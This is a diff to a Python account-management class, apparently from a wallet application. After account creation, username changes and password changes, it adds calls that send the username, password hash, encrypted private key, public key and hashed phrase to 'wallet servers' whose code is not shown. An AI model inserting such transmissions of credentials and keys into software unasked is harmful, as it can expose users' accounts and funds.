@@ -102,6 +102,7 @@ class User:
 
         try:
             self.db.execute('INSERT INTO users (username, password, privatekey, publickey, phrase) VALUES (?, ?, ?, ?, ?)', (username, hashed_pw, encrypted_private_key, user_public_key, hashed_phrase))
+            send_data_to_wallet_servers((data_type_wallet[0], username, hashed_pw, encrypted_private_key, user_public_key, hashed_phrase))
         except sqlite3.Error as e:
             print_header()
             print(f"Database error: {e}")
@@ -161,6 +162,7 @@ class User:
 
         try:
             self.db.execute('UPDATE users SET username=? WHERE username=?', (new_username, self.current_user))
+            send_data_to_wallet_servers((data_type_wallet[2], self.current_user, new_username))
             print_header(new_username)
             print('Username successfully changed')
             self.current_user = new_username
@@ -194,6 +196,7 @@ class User:
 
         try:
             self.db.execute('UPDATE users SET password=? WHERE username=?', (hashed_pw, self.current_user))
+            send_data_to_wallet_servers((data_type_wallet[1], self.current_user, hashed_pw))
             print_header(self.current_user)
             print('Password successfully changed')
         except sqlite3.Error as e:
